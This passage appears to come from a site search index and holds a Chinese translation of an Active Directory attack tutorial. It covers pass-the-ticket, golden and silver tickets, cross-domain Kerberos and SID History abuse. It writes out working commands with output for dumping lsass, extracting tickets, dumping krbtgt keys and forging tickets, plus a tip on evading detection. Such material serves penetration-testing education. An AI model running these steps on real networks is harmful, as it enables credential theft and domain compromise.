<p><code>$ cerbero hash 'Vader1234!' -u contoso.local/Anakin rc4:cdeae556dc28c24b5b7b14e9df5b6e21 aes128:18fe293e673950214c67e9f9fe753198 aes256:ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e</code></p> <p>\u7528cerbero\u8ba1\u7b97Kerberos\u5bc6\u94a5</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#pass-the-ticket","title":"Pass the Ticket","text":"<p>\u8fdb\u884cPass the Ticket\u653b\u51fb\u65f6\uff0c\u9996\u5148\u9700\u8981\u7a83\u53d6\u7968\u8bc1\u548c\u76f8\u5173\u7684\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u5e76\u4f7f\u7528\u5b83\u4eec\u6765\u5192\u5145\u7528\u6237\uff0c\u4ee5\u4fbf\u8bbf\u95ee\u76f8\u5173\u8d44\u6e90\u6216\u670d\u52a1\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136TGT\u548cST\u90fd\u662f\u53ef\u4ee5\u4f7f\u7528\u7684\uff0c\u4f46TGTs\u662f\u9996\u9009\uff0c\u56e0\u4e3a\u53ef\u4ee5\u5229\u7528\u5b83\u5192\u5145\u7528\u6237\u6765\u8bbf\u95ee\u4efb\u4f55\u670d\u52a1\uff08\u901a\u8fc7\u4f7f\u7528\u5b83\u6765\u8bf7\u6c42ST)\uff0c\u800cST\u53ea\u80fd\u7528\u4e8e\u8bbf\u95ee\u4e00\u79cd\u670d\u52a1\uff08\u5982\u679cSPN\u88ab\u4fee\u6539\u4e3a\u540c\u4e00\u7528\u6237\u7684\u53e6\u4e00\u4e2a\u670d\u52a1\uff0c\u5219\u80fd\u8bbf\u95ee\u591a\u79cd\u670d\u52a1\uff09\u3002</p> <p>\u5728Windows\u7cfb\u7edf\u4e2d\uff0c\u7968\u8bc1\u53ef\u4ee5\u5728lsass\u8fdb\u7a0b\u5185\u5b58\u4e2d\u627e\u5230\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528mimikatz sekurlsa::tickets\u547d\u4ee4\u6216Rubeus dump\u547d\u4ee4\u63d0\u53d6\u7968\u8bc1\u3002\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528procdump\u3001sqldumper\u6216\u5176\u4ed6\u5de5\u5177\u8f6c\u50a8lsass\u8fdb\u7a0b\uff0c\u5e76\u4f7f\u7528mimikatz\u6216Pypykatz\u79bb\u7ebf\u63d0\u53d6\u7968\u8bc1\u3002\u8fd9\u4e9b\u547d\u4ee4\u90fd\u80fd\u63d0\u53d6krb\u683c\u5f0f\u7684\u7968\u8bc1\u3002</p> <p><code>PS C:\\&gt; .\\procdump.exe -accepteula -ma lsass.exe lsass.dmp  ProcDump v10.0 - Sysinternals process dump utility Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com  [12:03:17] Dump 1 initiated: C:\\lsass.dmp [12:03:18] Dump 1 writing: Estimated dump file size is 34 MB. [12:03:18] Dump 1 complete: 34 MB written in 1.0 seconds [12:03:18] Dump count reached.</code></p> <p>\u901a\u8fc7procdump\u8f6c\u50a8lsass\u5185\u5b58</p> <p><code>$ pypykatz lsa minidump lsass.dmp -k /tmp/kerb &gt; output.txt INFO:root:Parsing file lsass.dmp INFO:root:Writing kerberos tickets to /tmp/kerb $ ls /tmp/kerb/  lsass.dmp_51a1d3f3.ccache                                                        'TGS_CONTOSO.LOCAL_WS02-7$_WS02-7$_29a9c991.kirbi'  lsass.dmp_c9a82a35.ccache                                                         TGT_CONTOSO.LOCAL_anakin_krbtgt_CONTOSO.LOCAL_6483baf5.kirbi  TGS_CONTOSO.LOCAL_anakin_LDAP_dc01.contoso.local_contoso.local_f8a46ad5.kirbi    'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_740ef529.kirbi' 'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_b9833fa1.kirbi'                'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_77d63cf0.kirbi' 'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_bfed6415.kirbi'                'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_7ac74bd6.kirbi' 'TGS_CONTOSO.LOCAL_WS02-7$_ldap_dc01.contoso.local_contoso.local_2129bc1c.kirbi'  'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_fdb8b40a.kirbi' 'TGS_CONTOSO.LOCAL_WS02-7$_LDAP_dc01.contoso.local_contoso.local_719218c6.kirbi'</code></p> <p>\u7528pypykatz\u4ecelsass\u8f6c\u50a8\u4e2d\u68c0\u7d22\u7968\u8bc1</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u5728\u4f5c\u4e3a\u57df\u4e00\u90e8\u5206\u7684Linux\u673a\u5668\u4e2d\uff0c\u7968\u8bc1\u901a\u5e38\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u5b58\u50a8\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7968\u8bc1\u901a\u5e38\u53ef\u4ee5\u5728/tmp\u76ee\u5f55\u4e0b\u7684\u683c\u5f0f\u4e3akrb5cc_%{uid}\u7684\u6587\u4ef6\u4e2d\u627e\u5230\uff0c\u5176\u4e2duid\u662f\u7528\u6237uid\u3002\u4e3a\u4e86\u83b7\u53d6\u7968\u8bc1\uff0c\u53ea\u9700\u590d\u5236\u8be5\u6587\u4ef6\u5373\u53ef\uff08\u5982\u679c\u60a8\u6709\u76f8\u5e94\u7684\u6743\u9650\u7684\u8bdd\uff09\u3002\u4f46\u662f\uff0c\u7968\u8bc1\u4e5f\u6709\u53ef\u80fd\u5b58\u50a8\u5728Linux\u5185\u6838\u5bc6\u94a5\u4e2d\u800c\u4e0d\u662f\u6587\u4ef6\u4e2d\uff0c\u8fd9\u65f6\u60a8\u53ef\u4ee5\u4f7f\u7528tickey\u6765\u83b7\u53d6\u5b83\u4eec\u3002</p> <p>\u4e3a\u4e86\u786e\u5b9a\u7968\u8bc1\u5b58\u50a8\u5728Linux\u673a\u5668\u4e2d\u7684\u5177\u4f53\u4f4d\u7f6e\uff0c\u60a8\u53ef\u4ee5\u68c0\u67e5/etc/krb5.conf\u4e2d\u7684Kerberos\u914d\u7f6e\u6587\u4ef6\u3002\u53e6\u5916\uff0c\u5728Linux\u673a\u5668\u4e2d\uff0c\u7968\u8bc1\u901a\u5e38\u4ee5ccache\u683c\u5f0f\u8fdb\u884c\u5b58\u50a8\u3002</p> <p>\u4e3a\u4e86\u5728Windows\u8ba1\u7b97\u673a\u4e2d\u4f7f\u7528\u7968\u8bc1\uff0c\u5fc5\u987b\u5c06\u5b83\u4eec\u6ce8\u5165lsass\u8fdb\u7a0b\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u7528mimikatz kerberos::ptt\u547d\u4ee4\u6216Rubeus ptt\u547d\u4ee4\u6765\u5b8c\u6210\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u80fd\u591f\u8bfb\u53d6krb\u683c\u5f0f\u7684\u7968\u8bc1\u3002</p> <p><code>PS C:\\&gt; .\\mimikatz.exe    .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29  .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)  ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )   '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/  mimikatz # kerberos::ptt pikachu-tgt.kirbi   * File: 'pikachu-tgt.kirbi': OK</code></p> <p>\u5c06TGT\u6ce8\u5165\u5f53\u524dWindows\u4f1a\u8bdd</p> <p>\u4e00\u65e6\u7968\u8bc1\u88ab\u6ce8\u5165\u4f1a\u8bdd\uff0c\u4f60\u5c31\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u5de5\u5177\u901a\u8fc7\u7f51\u7edc\u5192\u5145\u7528\u6237\u8fdb\u884c\u5404\u79cd\u64cd\u4f5c\uff0c\u5982pexec\u3002</p> <p>\u5728Linux\u4e2d\uff0c\u53ea\u8981\u8bbe\u6cd5\u8ba9KRB5CCNAME\u73af\u5883\u53d8\u91cf\u6307\u5411\u7968\u8bc1\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7impacket\u5b9e\u7528\u7a0b\u5e8f\u4f7f\u7528\u8fd9\u4e9b\u7968\u8bc1\u4e86\u3002\u6ce8\u610f\uff0c\u4f7f\u7528impacket\u5b9e\u7528\u7a0b\u5e8f\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528-k-no-pass\u53c2\u6570\u3002\u53e6\u5916\uff0c\u8fd9\u91cc\u5fc5\u987b\u4f7f\u7528ccache\u683c\u5f0f\u7684\u7968\u8bc1\u3002</p> <p>\u901a\u8fc7ticket_converter.py\u811a\u672c\u6216cerbero convert\u547d\u4ee4\uff0c\u5c31\u80fd\u8ba9\u7968\u8bc1\u5728krb\uff08Windows\uff09\u548cccache\uff08Linux\uff09\u683c\u5f0f\u4e4b\u95f4\u76f8\u4e92\u8f6c\u6362\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#goldensilver-ticket","title":"Golden/Silver ticket","text":"<p>\u5728Active Directory\u4e2d\uff0cKerberos TGT\u662f\u4f7f\u7528krbtgt\u5e10\u6237\u7684\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684\u3002\u5728\u77e5\u9053\u8be5\u5bc6\u94a5\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u521b\u5efa\u81ea\u5b9a\u4e49TGT\uff0c\u5373\u6240\u8c13\u7684\u91d1\u7968\u3002</p> <p>\u8981\u83b7\u5f97krbtgt\u5bc6\u94a5\uff0c\u9700\u8981\u8bbf\u95eeActive Directory\u6570\u636e\u5e93\u3002\u4e3a\u6b64\uff0c\u53ef\u4ee5\u901a\u8fc7mimikatz lsadump::dsync\u547d\u4ee4\u6216impacket secretsdump.py\u811a\u672c\u6267\u884c\u8fdc\u7a0bdcsync\u653b\u51fb\uff0c\u6216\u8005\u4f7f\u7528ntdsutil\u6216vssadmin\u5728\u672c\u5730\u8f6c\u50a8ntds.dit\u6587\u4ef6\u6765\u5b9e\u73b0\u6b64\u76ee\u7684\u3002</p> <p><code>$ secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation  Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8b03404a4975e7226caf6162cfccba::: [*] Kerberos keys grabbed krbtgt:aes256-cts-hmac-sha1-96:5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162 krbtgt:aes128-cts-hmac-sha1-96:a268f61e103134bb7e975a146ed1f506 krbtgt:des-cbc-md5:0e6d79d66b4951cd [*] Cleaning up...</code></p> <p>\u7528secretsdump.py\u83b7\u53d6krbtgt\u5bc6\u94a5</p> <p>\u540c\u6837\uff0c\u5982\u679c\u6211\u4eec\u5f97\u5230\u4e86\u670d\u52a1\u7528\u6237\u7684Kerberos\u5bc6\u94a5\uff0c\u5c31\u53ef\u4ee5\u4e3a\u670d\u52a1\u521b\u5efa\u4e00\u4e2a\u81ea\u5b9a\u4e49ST\uff0c\u79f0\u4e3a\u94f6\u7968\uff08Silver Ticket\uff09\u3002\u5b9e\u9645\u4e0a\uff0c\u901a\u8fc7\u67e5\u770b\u7528\u6237\u767b\u5f55\u7684\u57df\u8ba1\u7b97\u673a\u7684lsass\u8fdb\u7a0b\u3001\u6267\u884cKerberoast\u548c\u8f6c\u50a8Active Directory\u6570\u636e\u5e93\u7b49\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u670d\u52a1\u7528\u6237\u7684\u5bc6\u94a5\u3002</p> <p>\u5229\u7528\u91d1\u7968\u548c\u94f6\u7968\uff0c\u53ef\u4ee5\u4e3a\u57df\u4e2d\u7684\u4efb\u4f55\u7528\u6237\u521b\u5efa\u7968\u8bc1\uff0c\u751a\u81f3\u4e3a\u4e0d\u5b58\u5728\u7684\u7528\u6237\u521b\u5efa\u7968\u8bc1\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539PAC\u7528\u6237\u7ec4\u5e76\u5305\u62ec\u4f8b\u5982\u201cDomain Admins\u201d\u7ec4\u6765\u8d4b\u4e88\u7968\u8bc1\u7528\u6237\u66f4\u9ad8\u7684\u7279\u6743\uff0c\u4ece\u800c\u83b7\u5f97\u57df\u7ba1\u7406\u5458\u7684\u7279\u6743\u3002</p> <p>\u6b64\u5916\uff0c\u6211\u4eec\u5fc5\u987b\u7528krbtgt\u5bc6\u94a5\u5bf9\u7968\u8bc1PAC\u8fdb\u884c\u7b7e\u540d\uff0c\u4f46\u5bf9\u4e8e\u94f6\u7968\u6765\u8bf4\uff0c\u5219\u4e0d\u80fd\u6267\u884c\u8be5\u64cd\u4f5c\uff1a\u6211\u4eec\u53ea\u77e5\u9053\u7528\u6237\u670d\u52a1\u5bc6\u94a5\uff0c\u6240\u4ee5\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u5047\u7b7e\u540d\uff0c\u56e0\u4e3a\u670d\u52a1\u7528DC\u9a8c\u8bc1PAC\u7b7e\u540d\u5bb9\u6613\u5f15\u8d77\u6000\u7591\u3002</p> <p>\u4e3a\u4e86\u521b\u5efa\u91d1\u7968\u548c\u94f6\u7968\uff0c\u53ef\u4ee5\u4f7f\u7528mimikatz kerberos::golden\u547d\u4ee4\u6216impacket ticketer.py\u811a\u672c\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u628a\u5b83\u4eec\u5f53\u4f5c\u4efb\u4f55\u7968\u8bc1\u6765\u4f7f\u7528\u3002\u5982\u679c\u53ef\u4ee5\u7684\u8bdd\uff0c\u8bf7\u4f7f\u7528AES256\u5bc6\u94a5\uff0c\u4ee5\u907f\u514d\u88abATA\u7b49\u5b89\u5168\u89e3\u51b3\u65b9\u6848\u68c0\u6d4b\u5230\u3002</p> <p><code>$ ticketer.py -domain-sid S-1-5-21-1372086773-2238746523-2939299801 -domain contoso.local Administrator -aes 5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation  [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for contoso.local/Administrator [*]     PAC_LOGON_INFO [*]     PAC_CLIENT_INFO_TYPE [*]     EncTicketPart [*]     EncAsRepPart [*] Signing/Encrypting final ticket [*]     PAC_SERVER_CHECKSUM [*]     PAC_PRIVSVR_CHECKSUM [*]     EncTicketPart [*]     EncASRepPart [*] Saving ticket in Administrator.ccache</code></p> <p>\u7528ticketer.py\u521b\u5efa\u91d1\u7968</p> <p>\u4e00\u65e6\u521b\u5efa\u4e86\u91d1\u7968\uff0c\u5c31\u80fd\u83b7\u5f97\u8be5\u7968\u8bc1\u4e2d\u6307\u5b9a\u7684\u6743\u9650\uff0c\u4ece\u800c\u53ef\u4ee5\u5192\u5145\u57df\u4e2d\u7684\u4efb\u4f55\u7528\u6237\uff0c\u751a\u81f3\u5192\u5145\u6839\u672c\u5c31\u4e0d\u5b58\u5728\u7684\u7528\u6237\uff0c\u5e76\u8bbf\u95ee\u57df\u4e2d\u7684\u4efb\u4f55\u670d\u52a1\u3002</p> <p>\u8981\u8bb0\u4f4f\u7684\u4e00\u70b9\u662f\uff0c\u4e00\u65e6\u521b\u5efa\u4e86\u91d1\u7968\uff0c\u5fc5\u987b\u572820\u5206\u949f\u5185\u4f7f\u7528\u5b83\uff0c\u5426\u5219KDC\u5c06\u68c0\u67e5PAC\u4fe1\u606f\uff0c\u4ee5\u9a8c\u8bc1\u5176\u6b63\u786e\u6027\u3002</p> <p>\u800c\u5728\u521b\u5efa\u94f6\u7968\u540e\uff0c\u53ea\u80fd\u83b7\u5f97\u8bbf\u95ee\u5df2\u7ecf\u83b7\u5f97\u5176\u5bc6\u7801\u7684\u7528\u6237\u7684\u670d\u52a1\u7684\u6743\u9650\u3002\u94f6\u7968\u7684\u4e00\u4e2a\u4f7f\u7528\u573a\u666f\u662f\uff0c\u5f53\u60a8\u62e5\u6709\u8ba1\u7b97\u673a\u57df\u5e10\u6237\u5bc6\u7801\u65f6\uff0c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8bbf\u95ee\u8ba1\u7b97\u673a\uff1a\u5373\u4f7f\u60a8\u5728\u8ba1\u7b97\u673a\u57df\u5e10\u6237\u5bf9\u5e94\u7684\u8ba1\u7b97\u673a\u4e2d\u6ca1\u6709\u7ba1\u7406\u5458\u6743\u9650\uff0c\u53ea\u8981\u77e5\u9053\u8be5\u8d26\u6237\u7684\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u4e3a\u5176\u670d\u52a1\u751f\u6210\u94f6\u7968\uff0c\u8fdb\u800c\u5192\u5145\u8be5\u673a\u5668\u7684\u7ba1\u7406\u5458\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u94f6\u7968\u53ef\u4ee5\u7528\u6765\u8bbf\u95ee\u4e00\u4e2a\u7528\u6237\u7684\u670d\u52a1\uff0c\u800c\u91d1\u7968\u53ef\u4ee5\u7528\u6765\u8bbf\u95ee\u57df\u4e2d\u7684\u4efb\u4f55\u670d\u52a1\u2026\u2026\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-across-domains","title":"Kerberos Across domains","text":"<p>\u91d1\u7968\u4e5f\u53ef\u4ee5\u7528\u6765\u653b\u51fb\u6574\u4e2a\u6797\u3002\u4f46\u662f\uff0c\u5728\u8fdb\u4e00\u6b65\u6df1\u5165\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u5148\u56de\u987e\u4e00\u4e0bKerberos\u662f\u5982\u4f55\u5728\u53d7\u4fe1\u57df\uff08trusted domains\uff09\u4e2d\u5de5\u4f5c\u7684\u3002</p> <p>\u6b63\u5982\u6211\u4eec\u4ee5\u524d\u6240\u770b\u5230\u7684\uff0c\u57df\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u4fe1\u4efb\u57df\u4e2d\u7684\u670d\u52a1\uff08\u4f7f\u7528\u4f20\u5165\u4fe1\u4efb\u6216\u53cc\u5411\u4fe1\u4efb\uff09\u3002\u8bbf\u95ee\u5916\u90e8\u57df\u8d44\u6e90\u7684\u8fc7\u7a0b\u8fd8\u9700\u8981\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7Kerberos\u5b8c\u6210\u3002</p> <p>\u4f46\u662f\uff0cKDC(DC)\u53ea\u80fd\u4e3a\u5176\u57df\u4e2d\u7684\u670d\u52a1\u9881\u53d1ST\uff0c\u90a3\u4e48\uff0cKerberos\u662f\u5982\u4f55\u8de8\u57df\u5de5\u4f5c\u7684\u5462\uff1f\u55ef\uff0c\u6709\u5fc5\u8981\u5411\u5916\u90e8\u57dfDC\u670d\u52a1\u5668\u8bf7\u6c42\u4e00\u4e2aST\uff0c\u4e3a\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8be5\u670d\u52a1\u5668\u7684TGT\u3002\u5f53\u6211\u4eec\u4e3a\u53e6\u4e00\u4e2a\u57df\u4e2d\u7684\u670d\u52a1\u8bf7\u6c42ST\u65f6\uff0c\u5916\u90e8KDC\u7684TGT\uff08\u79f0\u4e3ainter-realm TGT\uff09\u662f\u7531\u6211\u4eec\u7684KDC\u9881\u53d1\u7684\uff0c\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\u6240\u793a\uff1a</p> <p><code>KDC foo.com                                                    KDC bar.com     .---.                                                          .---.    /   /|                       .---4) TGS-REQ (TGT bar)-------&gt;  /   /|   .---. |                       |    + SPN: HTTP\\srvbar          .---. |   |   | '                       |    + TGT client &gt; bar.com      |   | '   |   |/                        |                                |   |/    '---'                         |   .--5) TGS-REP--------------&lt; '---'   v  ^                          |   | + ST client &gt; HTTP/srvbar   |  |                          |   |   |  |                          ^   v                                   .---.   |  '-2) TGS-REQ (TGT foo)--&lt;  _____                                  /   /|   |   + SPN: HTTP\\srvbar       |     | &lt;----------1) SPNEGO---------&gt; .---. |   |   + TGT client &gt; foo.com   |_____|                                |   | '   |                            /:::::/ &gt;----6) AP-REQ---------------&gt; |   |/   '--3) TGS-REP--------------&gt; client     + ST client &gt; HTTP/srvbar   '---'       + TGT client &gt; bar.com    (foo.com)                               srvbar                                                                     (bar.com)</code></p> <p>\u8de8\u57dfKerberos</p> <ul> <li>\u6765\u81eafoo.com\u57df\u7684\u5ba2\u6237\u7aef/\u7528\u6237\u4f7f\u7528SPNEGO\u4e0e\u6240\u9700\u7684\u670d\u52a1\u534f\u5546Kerberos\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5728\u672c\u4f8b\u4e2d\uff0c\u6240\u9700\u670d\u52a1\u4e3a\u6765\u81eabar.domain\u7684HTTPsrvbar\uff08\u670d\u52a1\u5668srvbar\u4e2d\u7684Web\u670d\u52a1\u5668\uff09\u3002</li> <li>\u5ba2\u6237\u7aef\u901a\u8fc7\u53d1\u9001TGS-REQ\u6d88\u606f\uff0c\u4f7f\u7528foo.com\u7684TGT\u5411\u5176KDC\u8bf7\u6c42\u7528\u4e8eHTTP\\srvbar\u7684ST\u3002</li> <li>KDC\u8bc6\u522b\u51fa\u8be5\u670d\u52a1\u4f4d\u4e8e\u4fe1\u4efb\u57dfbar.com\u4e2d\u3002\u56e0\u6b64\uff0cfoo.com\u7684KDC\u5c06\u4e3abar.com\u521b\u5efa\u4e86\u4e00\u4e2aTGT\uff0c\u5e76\u4f7f\u7528\u57df\u95f4\u4fe1\u4efb\u5bc6\u94a5\uff08\u4fe1\u4efb\u53cc\u65b9\u5171\u4eab\u7684\u79d8\u5bc6\u5bc6\u94a5\uff09\u4f5c\u4e3a\u52a0\u5bc6\uff08\u548cPAC\u7b7e\u540d\uff09\u5bc6\u94a5\u3002\u7136\u540e\uff0cKDC\u901a\u8fc7TGS-REP\u6d88\u606f\u8fd4\u56debar.com\u7684TGT\u3002\u6ce8\u610f\uff0cbar.com TGT\u4e2d\u7684PAC\u5176\u5b9e\u5c31\u662ffoo.com TGT PAC\u7684\u526f\u672c\u3002</li> <li>\u5ba2\u6237\u7aef\u4f7f\u7528bar.com TGT\u901a\u8fc7\u53d1\u9001TGS-REQ\u6d88\u606f\u5411bar.com KDC\u8bf7\u6c42HTTP\\srvbar ST\u3002</li> <li>bar.com KDC\u901a\u8fc7\u4f7f\u7528\u57df\u95f4\u4fe1\u4efb\u5bc6\u94a5\u5bf9\u7968\u8bc1\u8fdb\u884c\u89e3\u5bc6\u6765\u68c0\u67e5\u7968\u8bc1\u3002\u7136\u540e\uff0c\u4e3a\u5ba2\u6237\u7aef\u7684HTTP\\srvbar\u521b\u5efa\u4e00\u4e2aST\u3002\u521b\u5efa\u65b0ST\u65f6\uff0c\u5c06\u590d\u5236TGT\u4e2d\u7684PAC\uff0c\u5e76\u5728\u5fc5\u8981\u65f6\u8fdb\u884c\u7b5b\u9009\u3002\u901a\u5e38\uff0c\u5b83\u4f1a\u5220\u9664\u4e0d\u5c5e\u4e8e\u53d7\u4fe1\u4efb\u57df\u6797\u7684\u989d\u5916SID\u3002</li> <li>\u6700\u540e\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528ST\u901a\u8fc7HTTP\\srvbar\u670d\u52a1\u5bf9\u81ea\u5df1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</li> </ul> <p>\u5947\u602a\u7684\u662f\uff0c\u57df\u95f4TGT\u901a\u5e38\u4f1a\u4f7f\u7528RC4\u7b97\u6cd5\u800c\u4e0d\u662fAES256\u7b97\u6cd5\u8fdb\u884c\u52a0\u5bc6\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#sid-history-attack","title":"SID History attack","text":"<p>\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u6709\u8da3\u4e4b\u5904\u5728\u4e8e\uff0c\u5728\u57df\u95f4\u4ea4\u4e92\u65f6\uff0cPAC\u4f1a\u5728\u7968\u8bc1\u4e4b\u95f4\u8fdb\u884c\u590d\u5236\u3002\u8fd9\u79cd\u884c\u4e3a\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u4e3a\u57df\u5236\u4f5c\u91d1\u7968\uff0c\u4ece\u800c\u5371\u53ca\u6574\u4e2a\u6797\u3002</p> <p>\u6b63\u5982\u6211\u4eec\u524d\u9762\u6240\u770b\u5230\u7684\uff0cPAC\u6709\u4e00\u4e2a\u5b57\u6bb5\u7528\u4e8e\u4fdd\u5b58\u989d\u5916\u7684SID\uff0c\u7528\u4e8e\u6807\u8bc6\u7279\u6b8a\u7684\u5b9e\u4f53\u3002\u8be5\u5b57\u6bb5\u901a\u5e38\u7528\u4e8e\u63d0\u4f9b\u5b58\u50a8\u5728SIDHistory\u5c5e\u6027\u4e2d\u7684\u90a3\u4e9bSID\u3002</p> <p>SID\u5386\u53f2\u8bb0\u5f55\u7528\u4e8e\u8fc1\u79fb\u4e4b\u7528\u3002\u5f53\u7528\u6237\u4ece\u4e00\u4e2a\u57df\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u57df\u65f6\uff0c\u5c06\u91cd\u7f6e\u8be5\u7528\u6237\u7684\u7279\u6743\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684SID\uff0c\u5e76\u5c06\u8be5\u7528\u6237\u6dfb\u52a0\u5230\u65b0\u7684\u7ec4\u4e2d\uff0c\u7b49\u7b49\u3002\u7136\u800c\uff0c\u6765\u81ea\u8be5\u7528\u6237\u5728\u65e7\u57df\u4e2d\u6240\u5c5e\u7ec4\u7684SID\uff0c\u4ecd\u4f1a\u5b58\u50a8\u5728SID History\u5c5e\u6027\u4e2d\u3002</p> <p>\u7136\u540e\uff0c\u5f53\u7528\u6237\u60f3\u8981\u8bbf\u95ee\u65e7\u57df\u4e2d\u7684\u8d44\u6e90\u65f6\uff0c\u4ed6\u4eec\u7684\u5386\u53f2SID\u5c06\u88ab\u6dfb\u52a0\u5230PAC\u989d\u5916SID\u5b57\u6bb5\u4e2d\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u65e7\u57df\u53ef\u4ee5\u68c0\u67e5\u8fd9\u4e9bSID\uff0c\u5e76\u6388\u4e88\u7528\u6237\u539f\u6709\u7684\u6743\u9650\uff0c\u4f7f\u7528\u6237\u5f97\u4ee5\u8bbf\u95ee\u65e7\u57df\u8d44\u6e90\u3002</p> <p>\u4f46\u662f\uff0c\u53ef\u4ee5\u6839\u636eSID\u8fc7\u6ee4\u7b56\u7565\u5ffd\u7565\u989d\u5916\u7684SID\uff08\u4e0d\u590d\u5236\u5230ST PAC\u4e2d\uff09\u3002\u901a\u5e38\uff0c\u57df\u5141\u8bb8\u6765\u81ea\u6797\u4e2d\u5176\u4ed6\u57df\u7684SID\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff09\uff0c\u4f46\u6839\u636eForestSpecific\u89c4\u5219\uff0c\u4ecd\u53ef\u80fd\u4f1a\u4e22\u5f03\u6765\u81ea\u5916\u90e8\u6797\u4e2d\u7684\u989d\u5916SID\uff0c\u56e0\u4e3a\u6797\u662fActive Directory\u7684\u5b89\u5168\u8fb9\u754c\u3002</p> <p>\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u9694\u79bb\u540c\u4e00\u6797\u7684\u57df\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7QuarantinedWithinForest\u7b56\u7565\u6765\u5220\u9664\u989d\u5916\u7684SID\u3002</p> <p>\u53e6\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0d\u540c\u6797\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\u5173\u7cfb\u6765\u542f\u7528SID\u5386\u53f2\u8bb0\u5f55\uff0c\u4f46\u5b58\u5728\u4e00\u4e9b\u9650\u5236\uff1a\u76ee\u6807\uff08\u4fe1\u4efb\uff09\u6797\u4e2d\u7684\u7ba1\u7406\u7ec4\uff0c\u5176RID\u5fc5\u987b\u5927\u4e8e1000\u3002\u56e0\u6b64\uff0c\u50cf\u201cDomain 